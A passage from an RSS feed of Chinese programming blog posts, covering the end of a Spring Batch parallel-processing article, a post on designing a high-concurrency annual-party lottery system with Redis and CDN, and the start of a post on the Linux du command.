					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46565504336525-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46565504336525-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46565504336525-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46565504336525-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46565504336525-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46565504336525-6&quot;&gt;6&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46565504336525-1&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Step &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;step&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46565504336525-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stepBuilders&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;step&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46565504336525-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;tasklet&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tasklet&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46565504336525-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;throttleLimit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46565504336525-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46565504336525-6&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0009 seconds] --&gt;
&lt;p&gt;上述示例中的tasklet需要实现TaskExecutor，Spring Batch提供了一个简单的多线程TaskExecutor供我们使用：SimpleAsyncTaskExecutor。&lt;/p&gt;
&lt;p&gt;并行执行不同的Step在Spring batch中很容易实现，以下是一个示例：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46568025032934&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
public Job job() {
    return stepBuilders.get(&quot;parallelSteps&quot;)
        .start(step1)
        .split(asyncTaskExecutor).add(flow1, flow2)
        .next(step3)
        .build();
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46568025032934-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46568025032934-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46568025032934-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46568025032934-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46568025032934-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46568025032934-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46568025032934-7&quot;&gt;7&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46568025032934-1&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Job &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46568025032934-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stepBuilders&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;parallelSteps&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46568025032934-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;step1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46568025032934-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;asyncTaskExecutor&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;flow1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;flow2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46568025032934-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;step3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46568025032934-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46568025032934-7&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0011 seconds] --&gt;
&lt;p&gt;在这个示例中我们先执行step1，然后并行执行flow1和flow2，最后再执行step3。&lt;/p&gt;
&lt;p&gt;Spring batch提供了PartitionStep来实现对同一个step在多个进程中实现并行处理。通过PartitonStep再配合PartitionHandler可以将一个step扩展到多个Slave上实现并行运行。&lt;/p&gt;
&lt;p&gt;远程执行Chunk任务则是将某个Step的processer操作分割到多个进程中，多个进程通过一些中间件进行通讯（比如采用消息的方式）。这种方式适合于Processer是瓶颈而Reader和Writer不是瓶颈的场景。&lt;/p&gt;
&lt;h2&gt;结语&lt;/h2&gt;
&lt;p&gt;Spring Batch对批处理场景进行了合理的抽象，封装了大量的实用功能，使用它来开发批处理应用可以达到事半功倍的效果。在使用的过程中我们仍需要坚持总结一些最佳实践，从而能够交付高质量的可维护的批处理应用，满足企业级应用的苛刻要求。&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109857&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109857votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109857&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/thoughtworkschina&quot;&gt;ThoughtWorks&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/thoughtworkschina&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/8a86f1338baa47a6e6bd4a03d41e36e6.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，为客户提供注重实效的咨询服务（IT组织优化、技术咨询、测试策略、客户体验）。同时我们也擅长构建定制化系统和产品，帮助客户快速将概念转化为价值。 我们满怀信心和激情，不断推动敏捷在中国IT业的推广和应用，提升中国软件开发的生产力。        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/thoughtworkschina&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/thoughtworkschina/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/thoughtworkschina/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 30&lt;/a&gt; · &lt;a title=&quot;我的网站&quot; target=&quot;_blank&quot; href=&quot;http://insights.thoughtworkers.org/&quot;&gt;&lt;i class=&quot;fa fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;微博主页&quot; target=&quot;_blank&quot; href=&quot;http://weibo.com/thoughtworkschina&quot;&gt;&lt;i class=&quot;fa fa-weibo&quot;&gt;&lt;/i&gt;&lt;/a&gt;         &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Fri, 13 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-13-109857-ee1fcbd9c.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-13-109857-ee1fcbd9c.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>我是如何开发公司年会抽奖系统的？</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;h3&gt;需求出现&lt;/h3&gt;
&lt;p&gt;年会将近，而年会抽奖环节必不可少，但是抽奖系统却还没有。所以某一天，PM走过来说：小伙，手头的需求修完成了吧！在年会开始之前必须做出一个抽奖系统。这个系统很简单，后台可以设置总金额，然后每个用户可以获得的金额范围，金额派完则显示很遗憾没有中奖，还要设置抽奖活动时间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/66337e1b4a4c06795af3ddd1a446c5e9.jpg&quot; alt=&quot;抽奖系统业务分析图&quot;&gt;&lt;/p&gt;
&lt;h3&gt;需求分析&lt;/h3&gt;
&lt;p&gt;一看这东西，就觉得非常简单。最简单的一个方案，活动时间放在一个数据表，总金额和已经使用金额存放在一个表，已经派送的日志一个表。后台提供一个接口，客户端手动点击按钮，则发送一个请求。账号体系直接使用微信的oauth，接口首先判断活动有没有开始，如果开始则随机一个金额，然后判断如果派送该金额会不会超预算，如果不超预算，则调用微信的现金接口发放零钱。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/2706a3866d4206acb0e076d1906a91cc.jpg&quot; alt=&quot;最原始的架构设计图&quot;&gt;&lt;/p&gt;
&lt;h3&gt;并发问题&lt;/h3&gt;
&lt;p&gt;这个简单方案存在一个致命的问题，就是并发下，可能导致超预算的问题。如果采用加锁的方式，面对1000多员工同时请求，系统100%瘫痪。（因为抽奖系统的服务器是最普通的1核1G 1M带宽的服务器）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/5d839bc38d96e3512c06d3c7602756bb.jpg&quot; alt=&quot;超预算问题触发情况&quot;&gt;&lt;/p&gt;
&lt;p&gt;那么不加锁的情况，又能如何避免并发造成的派送超过预算的问题呢？ 一个简单的办法，把分配派送金额的操作从并行变成串行。那么就需要异步的编程方法。最简单的处理方法，把任务写入mysql，然后启动一个独立的进程来一个任务一个任务的串行处理。异步的话，客户端如何知道服务器已经处理了呢？最简单就是采用轮询的方法了，客户端每隔几秒就请求服务器一次。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/c3d2aec3af80314537f4f04b6282c46c.jpg&quot; alt=&quot;异步处理抽奖操作&quot;&gt;&lt;/p&gt;
&lt;h3&gt;性能问题&lt;/h3&gt;
&lt;p&gt;由于抽奖是短时间大量用户请求的，如果直接让请求落到mysql，类似DDOS攻击,一般的数据库是扛不住的。而redis是1种基于内存的高并发NoSQL,在很多公司广泛使用,由于其性能非常好，并且其丰富的数据接口完全可以胜任抽奖任务需求。 这个时候，你可能有这样的疑问,我们的系统设计是怎么样的呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;抽奖系统相关配置存储在redis的一个key值，直接使用json格式&lt;/li&gt;
&lt;li&gt;客户端请求的时候判断，时间是否在活动时间范围内&lt;/li&gt;
&lt;li&gt;客户端请求如果时间在活动范围内，则把用户添加到一个redis集合，用于防止用户重复请求，只有第一次请求才会添加到集合后，再添加到一个redis列表。&lt;/li&gt;
&lt;li&gt;后台一个独立的进程，从redis列表pop第一位用户，然后分配一个金额，然后把金额和用户信息压入另一个redis列表B，同时写入redis的hash结构，标示用户获得多少现金。一直循环该过程。&lt;/li&gt;
&lt;li&gt;后台另一个独立的进程，从redis列表B pop第一位用户，然后调用发送现金接口，一直循环该过程。&lt;/li&gt;
&lt;li&gt;客户端不停轮询获取用户金额的接口，该接口从哪个hash结构获取用户金额，然后没有数据，则告诉客户端若干秒后再次请求。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/685c4e6f38a233a81dfbec224a0c5583.jpg&quot; alt=&quot;最终架构图&quot;&gt;&lt;/p&gt;
&lt;h3&gt;前端优化&lt;/h3&gt;
&lt;p&gt;由于参与活动的人数较多，而且服务器是放在外网的，所以需要考虑带宽的问题。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一步，把静态资源放到cdn。&lt;/li&gt;
&lt;li&gt;第二步，抽奖页面静态化，同时也放到cdn，这样子服务器只需要承受用户请求和登录即可。&lt;/li&gt;
&lt;li&gt;第三步，由于采用了微信登录，所以登录系统采用一个独立的进程，并且使用异步框架来处理高并发。&lt;/li&gt;
&lt;li&gt;第四步，前端发送请求队列化处理，避免用户不停点击，造成大量请求。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/b26c07a872203111d09e3bf8f38b0739.jpg&quot; alt=&quot;静态资源cdn化&quot;&gt;&lt;/p&gt;
&lt;h3&gt;总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;整套系统开发没有任何难度，唯一需要注意高并发下性能和数据问题。&lt;/li&gt;
&lt;li&gt;静态资源放到cdn，避免带宽成为瓶颈。&lt;/li&gt;
&lt;li&gt;把mysql操作变成redis操作，解决io问题&lt;/li&gt;
&lt;/ul&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109852&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109852votetotal&quot;&gt;2&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109852&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 4 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Fri, 13 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-13-109852-1711887c9.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-13-109852-1711887c9.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>每天一个 Linux 命令（34）： du 命令</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;Linux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的.&lt;/p&gt;
&lt;p&gt;1．命令格式：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09762792758695&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du [选项][文件]&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
